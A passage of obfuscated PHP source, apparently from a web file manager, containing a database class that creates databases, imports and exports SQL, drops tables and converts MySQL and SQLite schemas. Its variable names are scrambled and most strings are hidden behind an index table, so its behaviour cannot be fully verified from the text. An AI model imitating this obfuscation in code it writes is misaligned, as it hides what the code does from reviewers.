$ƒ¥¯°¾ß - $ø¾°ù°, $ß”¢‘•Ÿ); } break; } if (count($Œ®®€ó°) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($òÎíï™¶[1627], $òÎíï™¶[1628] . count($Œ®®€ó°) . "\73\163\164\141\162\x74\75{$ƒ¥¯°¾ß}\x2c\154\x65\x6e\x67\164\x68\x3d{$ß”¢‘•Ÿ}\x3b\160\x6f\x73\x65\72{$ø¾°ù°}\x7e{$èûìˆ©œ}"); throw new Exception($òÎíï™¶[1629]); } $Ë Œ­ª† = intval($ƒ¥¯°¾ß / $ÓóÃõ¨») * $ÓóÃõ¨»; $ê¾Ê°ç¹ = ceil(($ƒ¥¯°¾ß + $ß”¢‘•Ÿ) / $ÓóÃõ¨») * $ÓóÃõ¨» - $Ë Œ­ª†; $ö²ìûÜş = IO::fileSubstr($this->path, $Ë Œ­ª†, $ê¾Ê°ç¹); $Œ®®€ó°[$Ë Œ­ª† . $òÎíï™¶[12]] = $ö²ìûÜş; ksort($Œ®®€ó°); $ÑÊªÂ¥Ÿ = substr($ö²ìûÜş, $ƒ¥¯°¾ß - $Ë Œ­ª†, $ß”¢‘•Ÿ); return $ÑÊªÂ¥Ÿ; } private function log($Í‚‚™˜ë, $£í‘ã¬) { $éõ·“ŞÏ =& $_SERVER[÷åé¼î]; $¥å€ïŠ¹ = timeFloat() - $this->timeStart; write_log(sprintf($éõ·“ŞÏ[1630], $Í‚‚™˜ë, $this->info[$éõ·“ŞÏ[32]], $¥å€ïŠ¹, $£í‘ã¬), $éõ·“ŞÏ[1258]); } } goto Eìˆ‹ê“ö‚; eÉÔâíÓë: define($_SERVER[÷åé¼î][302], 1); define($_SERVER[÷åé¼î][303], 0); define($_SERVER[÷åé¼î][304], 2); goto cç´ê‚Û›·; eÓ•½ƒŠæÉ: class DbManage { function __construct($Êï®ìŞ» = array()) { $„ïÀ“¡µ =& $_SERVER[÷åé¼î]; if (empty($Êï®ìŞ»)) { $Êï®ìŞ» = $GLOBALS[$„ïÀ“¡µ[6]][$„ïÀ“¡µ[21]]; } $this->database = $Êï®ìŞ»; } public function model($·Ş’Á±û = '') { return new ModelBase($·Ş’Á±û, $_SERVER[÷åé¼î][12], $this->database); } public function db($•İÔ­ ¶ = false) { $ê´×…÷ø =& $_SERVER[÷åé¼î]; $ó«å®æ = array_change_key_case($this->database); if ($this->dbType() == $ê´×…÷ø[13] || !$•İÔ­ ¶) { return $this->model()->db(); } $É§Ññ’ = $ó«å®æ[$ê´×…÷ø[1044]]; $ó«å®æ[$ê´×…÷ø[1044]] = $ê´×…÷ø[12]; if ($ó«å®æ[$ê´×…÷ø[1039]] == $ê´×…÷ø[1036]) { $ß¡ë€õ = $ó«å®æ[$ê´×…÷ø[1045]]; $ó«å®æ[$ê´×…÷ø[1045]] = substr($ß¡ë€õ, 0, strrpos($ß¡ë€õ, $ê´×…÷ø[1131])); } $this->database = $ó«å®æ; $ĞÕ‘ÅÃ = $this->model()->db(); try { $¢ÎÕµ»» = $ĞÕ‘ÅÃ->execute("\163\150\157\167\40\144\141\164\141\142\x61\163\x65\x73\x20\x6c\x69\x6b\145\40\47{$É§Ññ’}\47"); } catch (Exception $Ù­İíğ) { } if (!$¢ÎÕµ»») { $ĞÕ‘ÅÃ->execute("\143\x72\145\141\164\145\40\x64\x61\x74\x61\x62\x61\x73\145\40\140{$É§Ññ’}\140"); } $ó«å®æ[$ê´×…÷ø[1044]] = $É§Ññ’; if ($ó«å®æ[$ê´×…÷ø[1039]] == $ê´×…÷ø[1036]) { $ó«å®æ[$ê´×…÷ø[1045]] .= $ê´×…÷ø[1131] . $É§Ññ’; } $this->database = $ó«å®æ; $ĞÕ‘ÅÃ->execute("\165\x73\145\x20\x60{$É§Ññ’}\140"); return $ĞÕ‘ÅÃ; } public function createTable($‚¨ô“¾, &$¹ùêŸêš) { $¬ÌÉì =& $_SERVER[÷åé¼î]; if (!IO::exist($‚¨ô“¾)) { ActionCall($¬ÌÉì[1132], !0, 0); show_json(LNG($¬ÌÉì[1133]), !1); } $¼¾øˆ¿ = $this->model()->db(); $Öà²»Â­ = sqlSplit(IO::getContent($‚¨ô“¾)); foreach ($Öà²»Â­ as $ˆıÀçÍ) { $ş’²ˆÚé = stripos($ˆıÀçÍ, $¬ÌÉì[1134]) === 0; if ($ş’²ˆÚé) { $¹ùêŸêš->task[$¬ÌÉì[1135]] += 1; } $¼¾øˆ¿->execute($ˆıÀçÍ); if ($ş’²ˆÚé) { preg_match($¬ÌÉì[1136], $ˆıÀçÍ, $Á‰Õ†­§); $¹ùêŸêš->task[$¬ÌÉì[1137]] = $Á‰Õ†­§[1]; $¹ùêŸêš->update(1); } } } public function insertTable($èÀû—úõ, &$—§ÄŸß´) { $”‚´ =& $_SERVER[÷åé¼î]; $ê£Š§› = $this->model()->db(); $Â¸ıÓÇ’ = $§ì¾…í ? array($§ì¾…í) : $ê£Š§›->getTables(); foreach ($èÀû—úõ as $Æüá˜š†) { $§ì¾…í = basename($Æüá˜š†, $”‚´[853]); if (!in_array($§ì¾…í, $Â¸ıÓÇ’)) { continue; } $—§ÄŸß´->task[$”‚´[1137]] = $§ì¾…í; if (get_filesize($Æüá˜š†) == 0) { continue; } $ú®Ş™‡ = $this->sqlToDb($Æüá˜š†, $—§ÄŸß´); if (!$ú®Ş™‡) { ActionCall($”‚´[1132], !0, 0); show_json(LNG($”‚´[1138]) . "\133{$§ì¾…í}\x5d", !1); } } } public function sqlFromDb($­ØùßÌÂ, $³ÕÜŠã, &$å“¡û, $«´íÙİ = '') { if ($å“¡û) { $å“¡û->task[$_SERVER[÷åé¼î][1137]] = $­ØùßÌÂ; } $‹Œ£Ä‚ß = $this->model($­ØùßÌÂ); $³ùÑ½£Õ = 0; $•íÎšŸ = 0; $¢–£à°ó = 10000; $îæ†¸²¦ = fopen($³ÕÜŠã, $_SERVER[÷åé¼î][1139]); $ò²‹¦†‡ = $‹Œ£Ä‚ß->getPk(); $ÊëŠ·» = $‹Œ£Ä‚ß->getDbFields(); $˜·È¾Š = $_SERVER[÷åé¼î][12]; if ($GLOBALS[$_SERVER[÷åé¼î][852]] && in_array($­ØùßÌÂ, array($_SERVER[÷åé¼î][1140], $_SERVER[÷åé¼î][1141]))) { $˜·È¾Š = $­ØùßÌÂ; } do { $ÉäÄ¿Å = array($ò²‹¦†‡ => array($_SERVER[÷åé¼î][1086], $•íÎšŸ)); $³Ÿ‘Æ = $‹Œ£Ä‚ß->where($ÉäÄ¿Å)->field($ÊëŠ·»)->order($ò²‹¦†‡ . $_SERVER[÷åé¼î][1142])->limit($¢–£à°ó)->select(); $³Ÿ‘Æ = !empty($³Ÿ‘Æ) ? $³Ÿ‘Æ : array(); if (!($âÉõõš = count($³Ÿ‘Æ))) { break; } $Ê“İ«ıÒ = end($³Ÿ‘Æ); $•íÎšŸ = $Ê“İ«ıÒ[$ò²‹¦†‡]; $­ıÔìì = array(); foreach ($³Ÿ‘Æ as $òÔ¯¢ñÄ) { if ($˜·È¾Š) { if ($­ØùßÌÂ == $_SERVER[÷åé¼î][1140]) { if ($òÔ¯¢ñÄ[$_SERVER[÷åé¼î][33]] == $_SERVER[÷åé¼î][1143]) { $Áƒí¨³¥ = json_decode($òÔ¯¢ñÄ[$_SERVER[÷åé¼î][434]], !0); if ($Áƒí¨³¥[$_SERVER[÷åé¼î][32]] == $GLOBALS[$_SERVER[÷åé¼î][852]] && $Áƒí¨³¥[$_SERVER[÷åé¼î][815]] != 1) { continue; } } } else { if ($òÔ¯¢ñÄ[$_SERVER[÷åé¼î][33]] == $_SERVER[÷åé¼î][1144] && $òÔ¯¢ñÄ[$_SERVER[÷åé¼î][97]] == $_SERVER[÷åé¼î][847]) { continue; } } } if ($«´íÙİ) { $òÔ¯¢ñÄ[$_SERVER[÷åé¼î][87]] = "\173\x69\x6f\72{$«´íÙİ}\x7d" . substr($òÔ¯¢ñÄ[$_SERVER[÷åé¼î][87]], strlen("\x7b\151\x6f\x3a{$òÔ¯¢ñÄ[$_SERVER[÷åé¼î][882]]}\175")); $òÔ¯¢ñÄ[$_SERVER[÷åé¼î][882]] = $«´íÙİ; } $­ıÔìì[] = $_SERVER[÷åé¼î][1145] . $this->sqlEncode($òÔ¯¢ñÄ) . $_SERVER[÷åé¼î][1146]; } $¨¦ê‹†È = "\x49\x4e\x53\x45\122\124\40\111\x4e\x54\117\40\140{$­ØùßÌÂ}\140\x20\50\140" . implode($_SERVER[÷åé¼î][1147], $ÊëŠ·») . $_SERVER[÷åé¼î][1148]; fwrite($îæ†¸²¦, $¨¦ê‹†È . implode($_SERVER[÷åé¼î][1149], $­ıÔìì) . $_SERVER[÷åé¼î][74] . PHP_EOL); $³ùÑ½£Õ += $âÉõõš; if ($å“¡û) { $å“¡û->update($âÉõõš); } } while ($¢–£à°ó == $âÉõõš); fclose($îæ†¸²¦); return $³ùÑ½£Õ; } public function sqlToDb($¯íçÔ , &$Ò¤‹¸²©) { $Œ³éì¤õ =& $_SERVER[÷åé¼î]; $­•™–Îß = $this->model()->db(); $âî àçç = @fopen($¯íçÔ , $Œ³éì¤õ[1150]); if (!$âî àçç) { return !1; } $…¬ÎÈí = 0; $Ùëœùºä = $Œ³éì¤õ[12]; $Áâşµ‘Ë = array(); $Á»Ñ³Ë± = $this->dbType(); $Ë•ãöÓ = $Á»Ñ³Ë± == $Œ³éì¤õ[13] ? 500 : 2000; $Ê…§œ  = basename($¯íçÔ , $Œ³éì¤õ[853]); $ˆ¾µ­¬¡ = 0; $‹›Ç¡Ä– = 4194304; while (!feof($âî àçç)) { $©­œ ± = trim(fgets($âî àçç)); if (!$©­œ ±) { continue; } $‘Îí³Š¾ = $this->sqlDecode($©­œ ±, $Á»Ñ³Ë±, $Ê…§œ ); if (stripos($‘Îí³Š¾, $Œ³éì¤õ[415]) === 0) { if (!$Ùëœùºä) { $Ùëœùºä = $‘Îí³Š¾ . $Œ³éì¤õ[53]; } continue; } if ($Ò¤‹¸²©) { $Ò¤‹¸²©->task[$Œ³éì¤õ[1135]] += 1; } $…¬ÎÈí++; $Áâşµ‘Ë[] = rtrim(rtrim(trim($‘Îí³Š¾), $Œ³éì¤õ[50]), $Œ³éì¤õ[74]); $»šĞŞ™¹ = null; $’ÇÅ¬ŠÛ = strlen($‘Îí³Š¾); $ˆ¾µ­¬¡ += $’ÇÅ¬ŠÛ; $Ù ÙñğÁ = strlen($Ùëœùºä) + $ˆ¾µ­¬¡ + (count($Áâşµ‘Ë) - 1); if ($Ù ÙñğÁ >= $‹›Ç¡Ä–) { $»šĞŞ™¹ = array_pop($Áâşµ‘Ë); if ($…¬ÎÈí > 1) { $…¬ÎÈí--; } } if ($…¬ÎÈí >= $Ë•ãöÓ || $»šĞŞ™¹) { $‘Îí³Š¾ = $Ùëœùºä . implode($Œ³éì¤õ[50], $Áâşµ‘Ë); if (!$­•™–Îß->execute($‘Îí³Š¾)) { return !1; } if ($Ò¤‹¸²©) { $Ò¤‹¸²©->update($…¬ÎÈí); } $Áâşµ‘Ë = array(); $…¬ÎÈí = 0; $ˆ¾µ­¬¡ = 0; if ($»šĞŞ™¹) { $Áâşµ‘Ë = array($»šĞŞ™¹); $…¬ÎÈí = 1; $ˆ¾µ­¬¡ = $’ÇÅ¬ŠÛ; } } } fclose($âî àçç); if (!empty($Áâşµ‘Ë)) { $‘Îí³Š¾ = $Ùëœùºä . implode($Œ³éì¤õ[50], $Áâşµ‘Ë); if (!$­•™–Îß->execute($‘Îí³Š¾)) { return !1; } if ($Ò¤‹¸²©) { $Ò¤‹¸²©->update($…¬ÎÈí); } } return !0; } public function dropTable($ª€ú¦¸õ = null) { $¾ÛƒÇÆÁ = $this->model()->db(); $Ï¢…¤’Ø = $ª€ú¦¸õ ? array($ª€ú¦¸õ) : $¾ÛƒÇÆÁ->getTables(); if (!$Ï¢…¤’Ø) { return; } foreach ($Ï¢…¤’Ø as $ª€ú¦¸õ) { if ($ª€ú¦¸õ) { $ª€ú¦¸õ = strtolower($ª€ú¦¸õ); } else { continue; } $¾ÛƒÇÆÁ->execute("\x64\x72\157\160\40\x74\141\142\154\x65\40\x69\146\x20\145\x78\x69\163\164\163\40\140{$ª€ú¦¸õ}\140"); } } private function sqlEncode($äúÑıé) { $ıõÍÙîŠ =& $_SERVER[÷åé¼î]; $„½‘¼Å— = array(); foreach ($äúÑıé as $Á“œïØè) { if (is_array($Á“œïØè)) { $Á“œïØè = json_encode_force($Á“œïØè); } $Á“œïØè = addslashes($Á“œïØè); $Á“œïØè = str_replace(array($ıõÍÙîŠ[1151], $ıõÍÙîŠ[262], $ıõÍÙîŠ[402]), array($ıõÍÙîŠ[1152], $ıõÍÙîŠ[1153], $ıõÍÙîŠ[1154]), $Á“œïØè); $„½‘¼Å—[] = $Á“œïØè; } return $ıõÍÙîŠ[58] . implode($ıõÍÙîŠ[1155], $„½‘¼Å—) . $ıõÍÙîŠ[58]; } private function sqlDecode($Ìõ¾ëˆ, $äÔÊñ», $ô•—£Ë¤ = '') { $ÆÛÙŸÑ =& $_SERVER[÷åé¼î]; $Ìõ¾ëˆ = str_replace(array($ÆÛÙŸÑ[1152], $ÆÛÙŸÑ[1153], $ÆÛÙŸÑ[1154]), array($ÆÛÙŸÑ[1151], $ÆÛÙŸÑ[262], $ÆÛÙŸÑ[402]), $Ìõ¾ëˆ); if ($äÔÊñ» == $ÆÛÙŸÑ[13]) { $Ìõ¾ëˆ = str_ireplace($ÆÛÙŸÑ[1156], $ÆÛÙŸÑ[59], $Ìõ¾ëˆ); $Ìõ¾ëˆ = stripslashes($Ìõ¾ëˆ); } return preg_replace($ÆÛÙŸÑ[1157], $ÆÛÙŸÑ[12], $Ìõ¾ëˆ); if ($äÔÊñ» == $ÆÛÙŸÑ[13]) { return $ô•—£Ë¤ != $ÆÛÙŸÑ[1158] ? stripslashes($Ìõ¾ëˆ) : $Ìõ¾ëˆ; } if ($ô•—£Ë¤ == $ÆÛÙŸÑ[1158]) { $Ìõ¾ëˆ = str_replace($ÆÛÙŸÑ[1159], $ÆÛÙŸÑ[121], stripslashes($Ìõ¾ëˆ)); } return $Ìõ¾ëˆ; } public function getSqlFile($Ü×İå§ = '') { $‰ïÇ¬Ù =& $_SERVER[÷åé¼î]; $¾Ù™¼Ÿ = $this->dbType(!0); $ûÏ­íõ© = CONTROLLER_DIR . "\151\156\x73\164\141\x6c\154\57\144\x61\164\x61\57{$¾Ù™¼Ÿ}\56\x73\161\154"; $…Ş­‘Æ = file_get_contents($ûÏ­íõ©); $„íÉ»¦ = $‰ïÇ¬Ù[1160] . ($¾Ù™¼Ÿ == $‰ïÇ¬Ù[869] ? $‰ïÇ¬Ù[1161] : $‰ïÇ¬Ù[1162]) . $‰ïÇ¬Ù[1163]; preg_match_all($„íÉ»¦, $…Ş­‘Æ, $ò¨õÈ•Ã); $şËôŞÅÙ = $ò¨õÈ•Ã[1]; $şÚÒ«ÌÁ = $this->model()->db(); $¹óöç÷Ê = $şÚÒ«ÌÁ->getTables(); $ÉÒš¸Ù˜ = TEMP_FILES . $‰ïÇ¬Ù[1164] . date($‰ïÇ¬Ù[272]) . $‰ïÇ¬Ù[8]; del_dir($ÉÒš¸Ù˜); mk_dir($ÉÒš¸Ù˜); $È±ò‘Ñã = $ÉÒš¸Ù˜ . $‰ïÇ¬Ù[1165]; $ú¿äîàƒ = $ÉÒš¸Ù˜ . $‰ïÇ¬Ù[1166]; $Éå³¾­ä = $¾Ù™¼Ÿ == $‰ïÇ¬Ù[13] ? $‰ïÇ¬Ù[869] : $‰ïÇ¬Ù[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\x61\154\x6c\57\144\141\x74\141\x2f{$Éå³¾­ä}\x2e\163\161\154", $ÉÒš¸Ù˜); @touch($ÉÒš¸Ù˜ . $¾Ù™¼Ÿ . $‰ïÇ¬Ù[853]); $°áçãé = fopen($È±ò‘Ñã, $‰ïÇ¬Ù[1139]); $„Í¶ùºà = fopen($ú¿äîàƒ, $‰ïÇ¬Ù[1139]); if ($¾Ù™¼Ÿ == $‰ïÇ¬Ù[13]) { $¹óöç÷Ê = array_diff($¹óöç÷Ê, array($‰ïÇ¬Ù[845], $‰ïÇ¬Ù[846])); $ˆßß²¢¥ = array($‰ïÇ¬Ù[1167], $‰ïÇ¬Ù[1168], $‰ïÇ¬Ù[1169]); fwrite($„Í¶ùºà, implode(PHP_EOL, $ˆßß²¢¥) . PHP_EOL . PHP_EOL); foreach ($¹óöç÷Ê as $èÈ”¼•ª) { $½¤ÃÕóƒ = $this->sqlFromSqlite($èÈ”¼•ª); if (!$½¤ÃÕóƒ[$‰ïÇ¬Ù[13]]) { continue; } fwrite($„Í¶ùºà, $½¤ÃÕóƒ[$‰ïÇ¬Ù[13]] . PHP_EOL . PHP_EOL); if (!in_array($èÈ”¼•ª, $şËôŞÅÙ)) { fwrite($°áçãé, $½¤ÃÕóƒ[$‰ïÇ¬Ù[869]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¹óöç÷Ê as $èÈ”¼•ª) { $½¤ÃÕóƒ = $this->sqlFromMysql($èÈ”¼•ª); if (!$½¤ÃÕóƒ[$‰ïÇ¬Ù[869]]) { continue; } fwrite($°áçãé, $½¤ÃÕóƒ[$‰ïÇ¬Ù[869]] . PHP_EOL . PHP_EOL); if (!in_array($èÈ”¼•ª, $şËôŞÅÙ)) { fwrite($„Í¶ùºà, $½¤ÃÕóƒ[$‰ïÇ¬Ù[13]] . PHP_EOL . PHP_EOL); } } } fclose($°áçãé); fclose($„Í¶ùºà); $…Ş­‘Æ = array($‰ïÇ¬Ù[869] => $È±ò‘Ñã, $‰ïÇ¬Ù[13] => $ú¿äîàƒ); return $Ü×İå§ ? $…Ş­‘Æ[$Ü×İå§] : $…Ş­‘Æ; } public function dbType($µÕ»çç« = false) { $ª†¶÷À° =& $_SERVER[÷åé¼î]; $†ïš ò‹ = $µÕ»çç« ? $GLOBALS[$ª†¶÷À°[6]][$ª†¶÷À°[21]] : $this->database; $†ïš ò‹ = array_change_key_case($†ïš ò‹); $‰×Í†ñ = $†ïš ò‹[$ª†¶÷À°[1039]]; if ($‰×Í†ñ == $ª†¶÷À°[1036]) { $İÌı±Ş§ = explode($ª†¶÷À°[4], $†ïš ò‹[$ª†¶÷À°[1045]]); $‰×Í†ñ = $İÌı±Ş§[0]; } $®’Çæôú = array($ª†¶÷À°[1170] => $ª†¶÷À°[13], $ª†¶÷À°[984] => $ª†¶÷À°[869]); if (isset($®’Çæôú[$‰×Í†ñ])) { $‰×Í†ñ = $®’Çæôú[$‰×Í†ñ]; } return $‰×Í†ñ; } public function sqlFromMysql($Øşœ’•, $™‰—®İå = '') { $¶³Åƒ– =& $_SERVER[÷åé¼î]; $ÂÇ–÷ = $this->model()->db(); $õİñƒ£ì = $ÂÇ–÷->query($¶³Åƒ–[1171] . $Øşœ’• . $¶³Åƒ–[445]); if (!$õİñƒ£ì || !$õİñƒ£ì[0]) { return !1; } $ª‘Æ¿ÜÓ = _get($õİñƒ£ì[0], $¶³Åƒ–[1172], $¶³Åƒ–[12]); if (!$ª‘Æ¿ÜÓ) { return !1; } $‚ùØ§à¾ = "\104\122\117\120\40\x54\x41\102\114\105\x20\111\x46\40\105\130\111\123\124\x53\x20\140{$Øşœ’•}\x60\73" . PHP_EOL . $ª‘Æ¿ÜÓ . $¶³Åƒ–[74]; if ($™‰—®İå && $™‰—®İå == $¶³Åƒ–[869]) { return $‚ùØ§à¾; } $„¯™í¦ = array_change_key_case($GLOBALS[$¶³Åƒ–[6]][$¶³Åƒ–[21]]); $”Û÷î… = $„¯™í¦[$¶³Åƒ–[1044]]; $ÎŒ¸®ø€ = $¶³Åƒ–[1173] . $”Û÷î… . $¶³Åƒ–[1174] . $Øşœ’• . $¶³Åƒ–[58]; $ôÔ³Ì¿µ = $¶³Åƒ–[1175] . $Øşœ’• . $¶³Åƒ–[972]; $Ãíİ÷¦ = $ÂÇ–÷->query($ÎŒ¸®ø€); if (empty($Ãíİ÷¦)) { $‡Ï”‚Ìö = array($¶³Åƒ–[869] => $¶³Åƒ–[12], $¶³Åƒ–[13] => $¶³Åƒ–[12]); return $™‰—®İå ? $‡Ï”‚Ìö[$™‰—®İå] : $‡Ï”‚Ìö; } $»–äàÔº = $ÂÇ–÷->query($ôÔ³Ì¿µ); $ü•ÑŒ‡ = $¶³Åƒ–[12]; $õ¼¸‹å· = array(); foreach ($»–äàÔº as $Ú ŠÓ²›) { if (!$ü•ÑŒ‡ && $Ú ŠÓ²›[$¶³Åƒ–[1176]] == $¶³Åƒ–[1177]) { $ü•ÑŒ‡ = $Ú ŠÓ²›[$¶³Åƒ–[1178]]; } if (isset($õ¼¸‹å·[$Ú ŠÓ²›[$¶³Åƒ–[1176]]])) { $õ¼¸‹å·[$Ú ŠÓ²›[$¶³Åƒ–[1176]]][$¶³Åƒ–[1179]][] = $Ú ŠÓ²›[$¶³Åƒ–[1178]]; continue; } $õ¼¸‹å·[$Ú ŠÓ²›[$¶³Åƒ–[1176]]] = array($¶³Åƒ–[1180] => $Ú ŠÓ²›[$¶³Åƒ–[1176]], $¶³Åƒ–[1179] => array($Ú ŠÓ²›[$¶³Åƒ–[1178]]), $¶³Åƒ–[1181] => $Ú ŠÓ²›[$¶³Åƒ–[1182]] == $¶³Åƒ–[91] ? 0 : 1); } $õ¿Š˜ç = array(); foreach ($õ¼¸‹å· as $Ú ŠÓ²›) { $ã¨—Õìò = $Ú ŠÓ²›[$¶³Åƒ–[1180]] == $¶³Åƒ–[1177]; $şÙ‡Ë‡ş = array($¶³Åƒ–[1183], $Ú ŠÓ²›[$¶³Åƒ–[1181]] == $¶³Åƒ–[91] && !$ã¨—Õìò ? $¶³Åƒ–[1184] : $¶³Åƒ–[12], $¶³Åƒ–[1185], $¶³Åƒ–[1186] . $Øşœ’• . $¶³Åƒ–[11] . ($ã¨—Õìò ? $¶³Åƒ–[1187] : $Ú ŠÓ²›[$¶³Åƒ–[1180]]) . $¶³Åƒ–[121], $¶³Åƒ–[1188], $¶³Åƒ–[121] . $Øşœ’• . $¶³Åƒ–[121], $¶³Åƒ–[1189] . implode($¶³Åƒ–[1190], $Ú ŠÓ²›[$¶³Åƒ–[1179]]) . $¶³Åƒ–[1191]); $õ¿Š˜ç[] = implode($¶³Åƒ–[53], $şÙ‡Ë‡ş) . $¶³Åƒ–[74]; } $ê¢á–¹É = array(); $‚­­É©¬ = array($¶³Åƒ–[1192] => $¶³Åƒ–[1193], $¶³Åƒ–[1193] => $¶³Åƒ–[1193], $¶³Åƒ–[348] => $¶³Åƒ–[375], $¶³Åƒ–[347] => $¶³Åƒ–[375]); foreach ($Ãíİ÷¦ as $Ú ŠÓ²›) { $şÙ‡Ë‡ş = array($¶³Åƒ–[121] . $Ú ŠÓ²›[$¶³Åƒ–[1194]] . $¶³Åƒ–[121], isset($‚­­É©¬[$Ú ŠÓ²›[$¶³Åƒ–[1195]]]) ? $‚­­É©¬[$Ú ŠÓ²›[$¶³Åƒ–[1195]]] : $Ú ŠÓ²›[$¶³Åƒ–[1196]], $Ú ŠÓ²›[$¶³Åƒ–[1197]] == $¶³Åƒ–[970] ? $¶³Åƒ–[1198] : $¶³Åƒ–[1199], $Ú ŠÓ²›[$¶³Åƒ–[1194]] == $ü•ÑŒ‡ ? $¶³Åƒ–[1200] : $¶³Åƒ–[12], $Ú ŠÓ²›[$¶³Åƒ–[1021]] ? strtoupper(str_replace($¶³Åƒ–[11], $¶³Åƒ–[12], $Ú ŠÓ²›[$¶³Åƒ–[1021]])) : $¶³Åƒ–[12]); $ê¢á–¹É[] = trim(implode($¶³Åƒ–[53], $şÙ‡Ë‡ş)); } $ÎÓ°ìî‘ = array($¶³Åƒ–[1201] . $Øşœ’• . $¶³Åƒ–[1202], $¶³Åƒ–[1203] . $Øşœ’• . $¶³Åƒ–[1204], implode($¶³Åƒ–[50] . PHP_EOL, $ê¢á–¹É), $¶³Åƒ–[1018]); $ ¶¶üŒ = implode(PHP_EOL, array_merge($ÎÓ°ìî‘, $õ¿Š˜ç)); if ($™‰—®İå && $™‰—®İå == $¶³Åƒ–[13]) { return $ ¶¶üŒ; } $‡Ï”‚Ìö = array($¶³Åƒ–[869] => $‚ùØ§à¾, $¶³Åƒ–[13] => $ ¶¶üŒ); return $™‰—®İå ? $‡Ï”‚Ìö[$™‰—®İå] : $‡Ï”‚Ìö; } public function sqlFromSqlite($è¶¶ˆáè, $äœ‚À¡ = '') { $®ùñ’Î =& $_SERVER[÷åé¼î]; $Ğ¿•±›ä = $this->model()->db(); $äŠ¿šø¶ = "\120\x52\x41\107\115\x41\x20\124\101\102\114\x45\x5f\x49\x4e\106\x4f\40\50\x27{$è¶¶ˆáè}\47\x29"; $©ÑÚŠÓÛ = "\123\x45\114\105\103\x54\x20\52\x20\x46\122\117\115\40\x73\161\x6c\x69\164\145\137\155\141\x73\x74\145\x72\x20\x57\110\x45\122\105\40\x74\x62\x6c\x5f\156\141\155\x65\x20\x3d\40\x27{$è¶¶ˆáè}\47"; $˜¬šÄ‹² = $Ğ¿•±›ä->query($äŠ¿šø¶); if (empty($˜¬šÄ‹²)) { $´œ‹ÚÆ = array($®ùñ’Î[869] => $®ùñ’Î[12], $®ùñ’Î[13] => $®ùñ’Î[12]); return $äœ‚À¡ ? $´œ‹ÚÆ[$äœ‚À¡] : $´œ‹ÚÆ; } $‰ùñÎ¦ş = $Ğ¿•±›ä->query($©ÑÚŠÓÛ); $¶øø´€Â = $–Œä™ = array(); foreach ($‰ùñÎ¦ş as $Õ°Ââ¤) { if ($Õ°Ââ¤[$®ùñ’Î[33]] == $®ùñ’Î[340]) { $¶øø´€Â[] = $Õ°Ââ¤[$®ùñ’Î[1205]]; } else { $–Œä™[$Õ°Ââ¤[$®ùñ’Î[32]]] = $Õ°Ââ¤[$®ùñ’Î[1205]]; } } $àÉ„ß·£ = array_merge(array($®ùñ’Î[1201] . $è¶¶ˆáè . $®ùñ’Î[121]), $¶øø´€Â, array_values($–Œä™)); $àÉ„ß·£ = implode($®ùñ’Î[74] . PHP_EOL, $àÉ„ß·£) . $®ùñ’Î[74]; if ($äœ‚À¡ && $äœ‚À¡ == $®ùñ’Î[13]) { return $àÉ„ß·£; } $ÚÎ…ôÎ™ = array(); $”Â‡‘ª = array($®ùñ’Î[1193] => $®ùñ’Î[1206], $®ùñ’Î[375] => $®ùñ’Î[1207]); $—ˆ»¶ = $®ùñ’Î[12]; foreach ($˜¬šÄ‹² as $Õ°Ââ¤) { if ($Õ°Ââ¤[$®ùñ’Î[57]] == $®ùñ’Î[91]) { $—ˆ»¶ = $Õ°Ââ¤[$®ùñ’Î[32]]; } $ù”¯Ö¶  = array($®ùñ’Î[445] . $Õ°Ââ¤[$®ùñ’Î[32]] . $®ùñ’Î[445], isset($”Â‡‘ª[$Õ°Ââ¤[$®ùñ’Î[33]]]) ? $”Â‡‘ª[$Õ°Ââ¤[$®ùñ’Î[33]]] : $Õ°Ââ¤[$®ùñ’Î[33]], $Õ°Ââ¤[$®ùñ’Î[35]] == $®ùñ’Î[91] ? $®ùñ’Î[1198] : $®ùñ’Î[1208] . $Õ°Ââ¤[$®ùñ’Î[56]], $Õ°Ââ¤[$®ùñ’Î[57]] == $®ùñ’Î[91] ? $®ùñ’Î[1209] : $®ùñ’Î[12]); $ÚÎ…ôÎ™[] = trim(implode($®ùñ’Î[53], $ù”¯Ö¶ )); } foreach ($–Œä™ as $ÛÁğÅñÚ => $œ¤…·“») { $àÁÂ¶¦Â = str_replace($®ùñ’Î[1210] . $è¶¶ˆáè . $®ùñ’Î[11], $®ùñ’Î[12], $ÛÁğÅñÚ); $˜ÜÅÛ– = str_replace(array($®ùñ’Î[121], $®ùñ’Î[1029]), $®ùñ’Î[445], substr($œ¤…·“», stripos($œ¤…·“», $®ùñ’Î[321]))); if ($àÁÂ¶¦Â == $®ùñ’Î[1187]) { $Æ¦Ø•¡§ = $®ùñ’Î[1211] . $—ˆ»¶ . $®ùñ’Î[1212]; } else { $Æ¦Ø•¡§ = (stripos($àÁÂ¶¦Â, $®ùñ’Î[11]) ? $®ùñ’Î[1213] : $®ùñ’Î[12]) . ($®ùñ’Î[1214] . $àÁÂ¶¦Â . $®ùñ’Î[1215] . $˜ÜÅÛ–); } $ÚÎ…ôÎ™[] = $Æ¦Ø•¡§; } $ÍüÕ±¢ = array($®ùñ’Î[1216] . $è¶¶ˆáè . $®ùñ’Î[1217], $®ùñ’Î[1218] . $è¶¶ˆáè . $®ùñ’Î[1219], implode($®ùñ’Î[50] . PHP_EOL, $ÚÎ…ôÎ™), $®ùñ’Î[1220]); $Ã•Ïôúİ = implode(PHP_EOL, $ÍüÕ±¢); if ($äœ‚À¡ && $äœ‚À¡ == $®ùñ’Î[869]) { return $Ã•Ïôúİ; } $´œ‹ÚÆ = array($®ùñ’Î[869] => $Ã•Ïôúİ, $®ùñ’Î[13] => $àÉ„ß·£); return $äœ‚À¡ ? $´œ‹ÚÆ[$äœ‚À¡] : $´œ‹ÚÆ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¥•æö²Ã, $Ï¡†² Ó) { $Õ×¡âú =& $_SERVER[÷åé¼î]; $Æ¢ùü†ì = $Ï¡†² Ó; $GLOBALS[$Õ×¡âú[1221]] = $Õ×¡âú[1222] . $¥•æö²Ã; Hook::trigger($Õ×¡âú[1222] . $¥•æö²Ã . $Õ×¡âú[1223], $Æ¢ùü†ì); $ìü¶œ¾å = self::driverMake($Ï¡†² Ó[0]); if (!$ìü¶œ¾å) { return !1; } if (method_exists($ìü¶œ¾å, $¥•æö²Ã)) { $Î›Ë¹é = 